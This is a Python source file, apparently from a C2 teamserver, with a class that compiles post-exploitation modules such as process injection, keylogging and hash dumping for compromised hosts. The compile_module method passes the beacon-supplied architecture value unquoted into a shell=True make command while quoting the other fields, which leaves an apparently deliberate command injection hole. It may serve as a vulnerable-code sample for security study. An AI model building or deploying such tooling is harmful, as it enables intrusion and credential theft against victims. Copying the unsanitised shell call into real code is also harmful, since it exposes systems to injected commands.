"""
Module compiler for C2 teamserver.

Compiles post-exploitation modules (process migration, keylogging,
credential dumping, etc.) for deployment to specific beacon targets
based on the target system's architecture and operating system.
"""

import subprocess
import shlex
import os
import re
import logging

logger = logging.getLogger(__name__)


class ModuleCompiler:
    """Compiles post-exploitation modules for beacon targets.

    Modules are compiled on-demand on the teamserver, targeting the
    specific architecture and OS of each beacon's compromised host.
    """

    # Maps user-facing architecture names to compiler target triples
    ARCH_MAP = {
        'x86': 'i686',
        'x64': 'x86_64',
        'arm': 'armv7',
        'arm64': 'aarch64'
    }

    AVAILABLE_MODULES = {
        'migrate', 'inject', 'keylog', 'screenshot',
        'hashdump', 'portscan', 'socks', 'upload'
    }

    def __init__(self, modules_dir='/app/modules'):
        self.modules_dir = modules_dir

    def _validate_module(self, module_name):
        """Validate that the requested module exists and has a safe name."""
        if not re.fullmatch(r'[a-zA-Z0-9_]+', module_name):
            raise ValueError(f"Invalid module name format: {module_name}")
        if module_name not in self.AVAILABLE_MODULES:
            raise ValueError(f"Unknown module: {module_name}")
        return module_name

    def compile_module(self, module_name, beacon_info):
        """Compile a module for a specific beacon's target system.

        The beacon provides information about the compromised host
        (architecture, OS) during registration. This data is used to
        select the correct compiler toolchain and flags.

        Args:
            module_name: Name of the module to compile (e.g., 'migrate')
            beacon_info: Dict with target system info from beacon registration:
                - arch: Target architecture reported by beacon
                - os: Target operating system reported by beacon
                - pid: Optional target process ID

        Returns:
            dict with 'success', 'module', 'output', 'errors'
        """
        module_name = self._validate_module(module_name)

        arch = beacon_info.get('arch', 'x64')
        os_type = beacon_info.get('os', 'windows')
        target_pid = beacon_info.get('pid', '0')

        # Resolve architecture to compiler target prefix
        # Falls back to the provided value for custom/unknown architectures
        compiler_arch = self.ARCH_MAP.get(arch, arch)

        # Sanitize remaining parameters for shell safety
        safe_os = shlex.quote(os_type)
        safe_pid = shlex.quote(str(target_pid))

        build_dir = os.path.join(self.modules_dir, module_name)

        cmd = (
            f"make -C {shlex.quote(build_dir)} "
            f"ARCH={compiler_arch} "
            f"TARGET_OS={safe_os} "
            f"TARGET_PID={safe_pid} "
            f"all"
        )

        logger.info(f"Compiling module {module_name} for arch={arch} os={os_type}")
        logger.debug(f"Build command: {cmd}")

        try:
            result = subprocess.run(
                cmd, shell=True,
                capture_output=True, text=True,
                timeout=60
            )

            return {
                'success': result.returncode == 0,
                'module': module_name,
                'output': result.stdout,
                'errors': result.stderr
            }
        except subprocess.TimeoutExpired:
            return {
                'success': False,
                'module': module_name,
                'output': '',
                'errors': 'Build timed out'
            }
